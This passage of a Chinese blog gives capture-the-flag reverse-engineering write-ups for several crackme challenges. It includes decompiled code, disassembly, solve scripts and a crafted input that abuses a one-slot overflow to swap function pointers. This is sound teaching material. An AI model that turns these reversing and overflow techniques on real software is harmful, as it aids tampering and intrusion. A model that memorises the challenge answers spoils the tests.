class="line"></span><br><span class="line">  v4 = *((_DWORD *)a1 + a2);</span><br><span class="line">  *((_DWORD *)a1 + a2) = *((_DWORD *)a1 + a3);</span><br><span class="line">  *((_DWORD *)a1 + a3) = v4;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将<code>a1 + a2</code> 与 <code>a1 + a3</code>处的数据进行交换</p><h4 id="fun1"><a href="#fun1" class="headerlink" title="fun1"></a>fun1</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">func1</span><span class="params">(_DWORD *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> abs32(a1[a2] + a1[a3]) - abs32(a1[a3]) - abs32(a1[a2]) + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即<code>|x1 + x2| - |x1| - |x2| + 2</code></p><h4 id="fun2"><a href="#fun2" class="headerlink" title="fun2"></a>fun2</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">func2</span><span class="params">(_DWORD *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> abs32(a1[a3]) - abs32(a1[a3] + a1[a2]) + abs32(a1[a2]) + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即<code>|x1| + |x2| - |x1 + x2| + 2</code></p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>我们的目标是使其输出flag, 即v8为0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        get_key(v13, v12);</span><br><span class="line">        system(<span class="string">&quot;PAUSE&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>而调用函数的循环中, 刚好溢出了一位</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ( i &lt;= <span class="number">2</span> )</span><br><span class="line">     &#123;</span><br><span class="line">       v5 = i + <span class="number">1</span>;</span><br><span class="line">       v7[v5] = ((<span class="keyword">int</span> (__cdecl *)(_DWORD *, <span class="keyword">int</span>, <span class="keyword">int</span>))v11[i])(v7, v9, v10);</span><br><span class="line">       v9 = ++i;</span><br><span class="line">       v10 = i + <span class="number">1</span>;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>即我们需要让最后一位得到的函数返回值为0， 但<code>fun2</code>的值必正值，<code>fun1</code>才有可能是0值。</p><p>则我们可以利用<code>fun0</code>的交换，将<code>fun1</code>与<code>fun2</code>函数指针进行交换，并设计读入的值使<code>fun2</code>返回值为0</p><p>则我们需要构造如下输入</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211015225248831.png" alt="image-20211015225248831"></p><p>其中<code>07 00 00 00</code>和<code>08 00 00 00</code>为读入的<code>v9</code>和<code>v10</code>的值（小端序), 这样就可以使得<code>v7 [7]</code>为<code>fun1</code>和<code>v7[8]</code>为<code>fun2</code>并在调用<code>fun0</code>时使其交换, 返回值为<code>0</code>, 给到<code>v7[1]</code></p><p>在第二次函数调用<code>fun2</code>时，传入参数为<code>v7, 1, 2</code>，即<code>|v7[1]| + |v7[2]| - |v7[1] + v7[2]| + 2</code>，由于<code>v7[1] == 0</code>， 故算得返回值<code>2</code>给到<code>v7[2]</code>,</p><p>在最后一次函数调用<code>fun3</code>时， 传入参数为<code>v7, 2, 3</code>， 即<code>|v7[2] + v8| - |v8| - |v7[2]| + 2</code>，则<code>v8</code>的值需要为<code>-1</code>才能使计算结果为<code>0</code></p><p>即构造输入<code>FF FF FF FF</code>，为读入的<code>v8</code>的值，得到上述文件</p><p>运行得到<code>flag</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211015231054530.png" alt="image-20211015231054530"></p><h3 id="MRCTF2020-EasyCpp"><a href="#MRCTF2020-EasyCpp" class="headerlink" title="[MRCTF2020]EasyCpp"></a>[MRCTF2020]EasyCpp</h3><p>分析如下</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211016001600213.png" alt="image-20211016001600213"></p><p>其中对比的数据需要动调得到, 解题脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reach</span>(<span class="params">x</span>):</span></span><br><span class="line">    d = x.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">1</span>:]</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">        <span class="built_in">sum</span> *= <span class="built_in">int</span>(i)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"></span><br><span class="line">items = [<span class="string">&quot;O0&quot;</span>, <span class="string">&quot;l1&quot;</span>, <span class="string">&quot;z2&quot;</span>, <span class="string">&quot;E3&quot;</span>, <span class="string">&quot;A4&quot;</span>, <span class="string">&quot;s5&quot;</span>, <span class="string">&quot;G6&quot;</span>, <span class="string">&quot;T7&quot;</span>, <span class="string">&quot;B8&quot;</span>, <span class="string">&quot;q9&quot;</span>, <span class="string">&quot;= &quot;</span>]</span><br><span class="line">table = &#123;<span class="built_in">ord</span>(i[<span class="number">0</span>]):<span class="built_in">ord</span>(i[<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> items&#125;</span><br><span class="line">check_num = [<span class="string">&quot;=zqE=z=z=z&quot;</span>, <span class="string">&quot;=lzzE&quot;</span>, <span class="string">&quot;=ll=T=s=s=E&quot;</span>, <span class="string">&quot;=zATT&quot;</span>, <span class="string">&quot;=s=s=s=E=E=E&quot;</span>, <span class="string">&quot;=EOll=E&quot;</span>, <span class="string">&quot;=lE=T=E=E=E&quot;</span>, <span class="string">&quot;=EsE=s=z&quot;</span>, <span class="string">&quot;=AT=lE=ll&quot;</span>]</span><br><span class="line">data = [i.translate(table) <span class="keyword">for</span> i <span class="keyword">in</span> check_num]</span><br><span class="line"><span class="built_in">print</span>(data) </span><br><span class="line">f = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    f += <span class="built_in">str</span>(reach(i) ^ <span class="number">1</span>)</span><br><span class="line">flag = hashlib.md5(f.encode()).hexdigest().upper()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span> + flag + <span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="SUCTF2018-babyre"><a href="#SUCTF2018-babyre" class="headerlink" title="[SUCTF2018]babyre"></a>[SUCTF2018]babyre</h3><p>ida打开得到主要逻辑，输入key会计算出flag, 则直接爆破即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">key</span>):</span></span><br><span class="line">    box = [<span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x07</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x14</span>, <span class="number">0x17</span>, <span class="number">0x16</span>, <span class="number">0x13</span>, <span class="number">0x1C</span>, <span class="number">0x19</span>, <span class="number">0x1E</span>, <span class="number">0x1F</span>, <span class="number">0x1C</span>, <span class="number">0x19</span>, <span class="number">0x1A</span>, <span class="number">0x1F</span>, <span class="number">0x24</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x27</span>, <span class="number">0x24</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x23</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2E</span>, <span class="number">0x2B</span>, <span class="number">0x24</span>, <span class="number">0x2D</span>, <span class="number">0x26</span>, <span class="number">0x2F</span>, <span class="number">0x38</span>, <span class="number">0x31</span>, <span class="number">0x3A</span>, <span class="number">0x3B</span>, <span class="number">0x34</span>, <span class="number">0x3D</span>, <span class="number">0x3E</span>, <span class="number">0x37</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x32</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, <span class="number">0x42</span>, <span class="number">0x42</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, <span class="number">0x4A</span>, <span class="number">0x4A</span>, <span class="number">0x4D</span>, <span class="number">0x4D</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x59</span>, <span class="number">0x59</span>, <span class="number">0x5A</span>, <span class="number">0x5B</span>, <span class="number">0x5C</span>, <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x5E</span>, <span class="number">0x60</span>, <span class="number">0x60</span>, <span class="number">0x63</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x67</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x69</span>, <span class="number">0x6B</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x6D</span>, <span class="number">0x6E</span>, <span class="number">0x6E</span>, <span class="number">0x70</span>, <span class="number">0x70</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x77</span>, <span class="number">0x77</span>, <span class="number">0x78</span>, <span class="number">0x79</span>, <span class="number">0x7B</span>, <span class="number">0x7B</span>, <span class="number">0x7D</span>, <span class="number">0x7D</span>, <span class="number">0x7F</span>, <span class="number">0x7F</span>, <span class="number">0x81</span>, <span class="number">0x81</span>, <span class="number">0x83</span>, <span class="number">0x83</span>, <span class="number">0x8C</span>, <span class="number">0x8D</span>, <span class="number">0x8E</span>, <span class="number">0x8F</span>, <span class="number">0x88</span>, <span class="number">0x89</span>, <span class="number">0x8A</span>, <span class="number">0x8B</span>, <span class="number">0x8C</span>, <span class="number">0x8D</span>, <span class="number">0x8E</span>, <span class="number">0x87</span>, <span class="number">0x98</span>, <span class="number">0x91</span>, <span class="number">0x92</span>, <span class="number">0x93</span>, <span class="number">0x94</span>, <span class="number">0x95</span>, <span class="number">0x96</span>, <span class="number">0x97</span>, <span class="number">0x98</span>, <span class="number">0x99</span>, <span class="number">0x9A</span>, <span class="number">0x9A</span>, <span class="number">0x9C</span>, <span class="number">0x9C</span>, <span class="number">0x9E</span>, <span class="number">0x9E</span>, <span class="number">0xA0</span>, <span class="number">0xA0</span>, <span class="number">0xA2</span>, <span class="number">0xA2</span>, <span class="number">0xA4</span>, <span class="number">0xA4</span>, <span class="number">0xA6</span>, <span class="number">0xA6</span>, <span class="number">0xA8</span>, <span class="number">0xA8</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAC</span>, <span class="number">0xAC</span>, <span class="number">0xAE</span>, <span class="number">0xAE</span>, <span class="number">0xB0</span>, <span class="number">0xB1</span>, <span class="number">0xB2</span>, <span class="number">0xB3</span>]</span><br><span class="line">    flag = [<span class="number">0</span>] * <span class="number">22</span></span><br><span class="line">    i = <span class="number">8</span></span><br><span class="line">    <span class="keyword">while</span> i:</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        j = <span class="number">22</span></span><br><span class="line">        <span class="keyword">while</span> j:</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line">            t = (box[<span class="number">22</span> * i + j] &gt;&gt; ((key &gt;&gt; (<span class="number">2</span> * i)) &amp; <span class="number">3</span>)) &amp; <span class="number">1</span></span><br><span class="line">            flag[j] |= t &lt;&lt; i</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(flag)</span><br><span class="line"></span><br><span class="line">flag_format = <span class="string">b&quot;SUCTF&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">65536</span>):</span><br><span class="line">    flag = decode(i)</span><br><span class="line">    <span class="keyword">if</span> flag[:<span class="built_in">len</span>(flag_format)] == flag_format:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="HDCTF2019-MFC"><a href="#HDCTF2019-MFC" class="headerlink" title="[HDCTF2019]MFC"></a>[HDCTF2019]MFC</h3><p>xspy探查控件，发现有一个消息并不是以宏的形式出现, 以及后面这一大串奇怪的字符串<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211017225922909.png" alt="image-20211017225922909"></p><p>写个程序向MFC程序发送这个消息即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	HWND h = FindWindowA(<span class="literal">NULL</span>, <span class="string">&quot;Flag就在控件里&quot;</span>);</span><br><span class="line">	SendMessage(h, <span class="number">0x0464</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行，发现窗口发生变化</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211017230352675.png" alt="image-20211017230352675"></p><p>结合上面，解密得到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">cipher = <span class="number">0x944c8d100f82f0c18b682f63e4dbaa207a2f1e72581c2f1b</span></span><br><span class="line">cipher = long_to_bytes(cipher)</span><br><span class="line">key = <span class="string">b&quot;&#123;I am a Des key&#125;&quot;</span>[:<span class="number">8</span>] <span class="comment"># Des密钥长度64bit</span></span><br><span class="line">des = DES.new(key, DES.MODE_ECB)</span><br><span class="line">plain = des.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure><h3 id="羊城杯-2020-Bytecode"><a href="#羊城杯-2020-Bytecode" class="headerlink" title="[羊城杯 2020]Bytecode"></a>[羊城杯 2020]Bytecode</h3><p>首先初始化了，常量en数组和ouput数组，然后对输入的flag进行四步计算</p><ol><li>len(flag) &gt;= 38</li><li>((((flag[0] * 2020+ flag[1]) * 2020 + flag[2]) * 2020 + flag[3]) * 2020 + flag[4]) == 1182843538814603， 这一步循环除以2020求商和余数即可, 实际上就是<code>GWHT&#123;</code></li><li>flag[5:32]与en数组进行异或加密 =&gt; x, 判断x == output</li><li>flag[-7:-2] 用六组方程进行判断， 这一步可以用z3解</li></ol><p>则解密脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">b&quot;GWHT&#123;&quot;</span></span><br><span class="line"></span><br><span class="line">en=[<span class="number">0x3</span>,<span class="number">0x25</span>,<span class="number">0x48</span>,<span class="number">0x9</span>,<span class="number">0x6</span>,<span class="number">0x84</span>]</span><br><span class="line">output=[<span class="number">101</span>, <span class="number">96</span>, <span class="number">23</span>, <span class="number">68</span>, <span class="number">112</span>, <span class="number">42</span>, <span class="number">107</span>, <span class="number">62</span>, <span class="number">96</span>, <span class="number">53</span>, <span class="number">176</span>, <span class="number">179</span>, <span class="number">98</span>, <span class="number">53</span>, <span class="number">67</span>, <span class="number">29</span>, <span class="number">41</span>, <span class="number">120</span>, <span class="number">60</span>, <span class="number">106</span>, <span class="number">51</span>, <span class="number">101</span>, <span class="number">178</span>, <span class="number">189</span>, <span class="number">101</span>, <span class="number">48</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    f1, f2 = output[i*<span class="number">2</span>] ^ en[i%<span class="number">6</span>], output[i*<span class="number">2</span>+<span class="number">1</span>] ^ en[i%<span class="number">6</span>]</span><br><span class="line">    flag += <span class="built_in">bytes</span>([f2]) + <span class="built_in">bytes</span>([f1])</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x = [Int(<span class="string">&#x27;x%d&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(x[<span class="number">0</span>]*<span class="number">3</span> + x[<span class="number">1</span>]*<span class="number">2</span> + x[<span class="number">2</span>]*<span class="number">5</span> == <span class="number">1003</span>)</span><br><span class="line">s.add(x[<span class="number">0</span>]*<span class="number">4</span> + x[<span class="number">1</span>]*<span class="number">7</span> + x[<span class="number">2</span>]*<span class="number">9</span>== <span class="number">2013</span>)</span><br><span class="line">s.add(x[<span class="number">0</span>]   + x[<span class="number">1</span>]*<span class="number">8</span> + x[<span class="number">2</span>]*<span class="number">2</span> == <span class="number">1109</span>)</span><br><span class="line">s.add(x[<span class="number">3</span>]*<span class="number">3</span> + x[<span class="number">4</span>]*<span class="number">2</span> + x[<span class="number">5</span>]*<span class="number">5</span> == <span class="number">671</span>)</span><br><span class="line">s.add(x[<span class="number">3</span>]*<span class="number">4</span> + x[<span class="number">4</span>]*<span class="number">7</span> + x[<span class="number">5</span>]*<span class="number">9</span>== <span class="number">1252</span>)</span><br><span class="line">s.add(x[<span class="number">3</span>]   + x[<span class="number">4</span>]*<span class="number">8</span> + x[<span class="number">5</span>]*<span class="number">2</span> == <span class="number">644</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> s.check() == sat</span><br><span class="line">m = s.model()</span><br><span class="line">flag += <span class="built_in">bytes</span>([m[i].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> x])</span><br><span class="line"><span class="built_in">print</span>(flag + <span class="string">b&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-Splendid-MineCraft"><a href="#ACTF新生赛2020-Splendid-MineCraft" class="headerlink" title="[ACTF新生赛2020]Splendid_MineCraft"></a>[ACTF新生赛2020]Splendid_MineCraft</h3><p>ida打开发现主要函数伪c代码如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+14h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// [esp+18h] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+20h] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">25</span>]; <span class="comment">// [esp+24h] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [esp+3Dh] [ebp-2Bh]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp+44h] [ebp-24h]</span></span><br><span class="line">  __int16 v12; <span class="comment">// [esp+48h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> Str1[<span class="number">4</span>]; <span class="comment">// [esp+4Ch] [ebp-1Ch]</span></span><br><span class="line">  __int16 v14; <span class="comment">// [esp+50h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">6</span>]; <span class="comment">// [esp+54h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v16[<span class="number">6</span>]; <span class="comment">// [esp+5Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, aWelcomeToActfS);</span><br><span class="line">  sub_381050(<span class="string">&quot;%s&quot;</span>, (<span class="keyword">char</span>)flag);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(flag) == <span class="number">26</span> &amp;&amp; !<span class="built_in">strncmp</span>(flag, <span class="string">&quot;ACTF&#123;&quot;</span>, <span class="number">5u</span>) &amp;&amp; v10 == <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    v3 = strtok(flag, <span class="string">&quot;_&quot;</span>);                     <span class="comment">// first split</span></span><br><span class="line">    *(_DWORD *)v15 = *(_DWORD *)(v3 + <span class="number">5</span>);       <span class="comment">// flag[5:11]</span></span><br><span class="line">    *(_WORD *)&amp;v15[<span class="number">4</span>] = *(_WORD *)(v3 + <span class="number">9</span>);</span><br><span class="line">    *(_DWORD *)v16 = *(_DWORD *)(v3 + <span class="number">5</span>);</span><br><span class="line">    *(_WORD *)&amp;v16[<span class="number">4</span>] = *(_WORD *)(v3 + <span class="number">9</span>);</span><br><span class="line">    v4 = strtok(<span class="number">0</span>, <span class="string">&quot;_&quot;</span>);</span><br><span class="line">    v11 = *(_DWORD *)v4;                        <span class="comment">// flag[12:18]</span></span><br><span class="line">    v12 = *((_WORD *)v4 + <span class="number">2</span>);</span><br><span class="line">    v7 = strtok(<span class="number">0</span>, <span class="string">&quot;_&quot;</span>);</span><br><span class="line">    *(_DWORD *)Str1 = *(_DWORD *)v7;            <span class="comment">// flag[19:25]</span></span><br><span class="line">    v14 = *((_WORD *)v7 + <span class="number">2</span>);</span><br><span class="line">    dword_383354 = (<span class="keyword">int</span>)sub_3851D8;</span><br><span class="line">    <span class="keyword">if</span> ( sub_3851D8(v15) )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = v16[<span class="number">2</span>] ^ v16[<span class="number">5</span>] ^ v16[<span class="number">0</span>] ^ v16[<span class="number">3</span>] ^ v16[<span class="number">1</span>] ^ v16[<span class="number">4</span>];</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0x100</span>; i &lt; <span class="number">496</span>; ++i )</span><br><span class="line">        *((_BYTE *)&amp;loc_385018 + i) ^= v8;</span><br><span class="line">      __asm &#123; jmp     eax &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Wrong\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>strtok</code>函数根据<a target="_blank" rel="noopener" href="http://www.cplusplus.com/reference/cstring/strtok/">strtok - C++ Reference (cplusplus.com)</a>, 可知flag大致格式为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ACTF&#123;??????_??????_??????&#125;</span><br></pre></td></tr></table></figure><p>动调进入<code>dword_3851D8</code>处的smc, 得到函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">BOOL __cdecl sub_3851FC(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char v2[<span class="number">20</span>]; // [esp+0h] [ebp-2Ch] BYREF</span><br><span class="line">  char v3[<span class="number">8</span>]; // [esp+14h] [ebp-18h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v4; // [esp+20h] [ebp-Ch]</span><br><span class="line">  <span class="built_in">int</span> v5; // [esp+24h] [ebp-8h]</span><br><span class="line">  <span class="built_in">int</span> i; // [esp+28h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  qmemcpy(v3, <span class="string">&quot;3@1b;b&quot;</span>, <span class="number">6</span>);</span><br><span class="line">  strcpy(v2, <span class="string">&quot;Welcome &quot;</span>);</span><br><span class="line">  v4 = <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2[i + <span class="number">12</span>] = (v2[i + <span class="number">1</span>] ^ v3[i]) + <span class="number">35</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v2[i + <span class="number">12</span>] == a1[i] )</span><br><span class="line">      ++v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5 == <span class="number">6</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写脚本得到第一部分flag: <code>yOu0y*</code></p><p>继续动调, 进入第二部分smc， 其中前面一大段全是将flag存放到某个位置, 关键代码如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:00385158 cmp     edi, 6</span><br><span class="line">.data:0038515B jge     short loc_385198</span><br><span class="line">.data:0038515D xor     ecx, ecx</span><br><span class="line">.data:0038515F mov     cl, [esi+edi]; 这里存放着flag</span><br><span class="line">.data:00385162 and     cl, 0FFh</span><br><span class="line">.data:00385165 sub     eax, 100h</span><br><span class="line">.data:0038516A xor     ebx, ebx</span><br><span class="line">.data:0038516C mov     bl, cl</span><br><span class="line">.data:0038516E mov     ecx, edi</span><br><span class="line">.data:00385170 add     ecx, 83h</span><br><span class="line">.data:00385176 xor     ebx, ecx</span><br><span class="line">.data:00385178 mov     bl, [eax+ebx]</span><br><span class="line">.data:0038517B jmp     short loc_385185</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> loc_385185:                             ; CODE XREF: .data:0038517B↑j</span><br><span class="line">.data:00385185 mov     cl, [eax+edi+166h]</span><br><span class="line">.data:0038518C cmp     bl, cl</span><br><span class="line">.data:0038518E jnz     short loc_3851A4</span><br><span class="line">.data:00385190 inc     edi</span><br><span class="line">.data:00385191 add     eax, 100h</span><br><span class="line">.data:00385196 jmp     short loc_385158</span><br></pre></td></tr></table></figure><p>该部分大致算法如下, 其中table为以<code>eax</code>存放的值为首地址的256个字节</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	<span class="keyword">if</span> table[flag2[i] ^ (<span class="number">0x83</span> + i)] == cmp_data[i]:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">	    <span class="comment"># Failed</span></span><br></pre></td></tr></table></figure><p>则解密得到第二部分flag<code>knowo3</code></p><p>第三部分flag校验比较简单，在主函数汇编内可以看到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">       push    6               ; MaxCount</span><br><span class="line">.text:003812CB                 push    offset a5mcsm   ; &quot;5mcsM&lt;&quot;</span><br><span class="line">.text:003812D0                 lea     ecx, [ebp+Str1]</span><br><span class="line">.text:003812D3                 push    ecx             ; Str1</span><br><span class="line">.text:003812D4                 call    ds:strncmp</span><br><span class="line">.text:003812DA                 add     esp, 0Ch</span><br><span class="line">.text:003812DD                 test    eax, eax</span><br><span class="line">.text:003812DF                 jz      short loc_3812F0</span><br><span class="line">.text:003812E1                 push    offset aWrong   ; &quot;Wrong\n&quot;</span><br><span class="line">.text:003812E6                 call    _printf</span><br><span class="line">.text:003812EB                 add     esp, 4</span><br><span class="line">.text:003812EE                 jmp     short loc_381305</span><br></pre></td></tr></table></figure><p>得到第三部分flag<code>5mcsM&lt;</code></p><p>则最终解密脚本如下:</p><figure class="highlight python"><table><tr><td 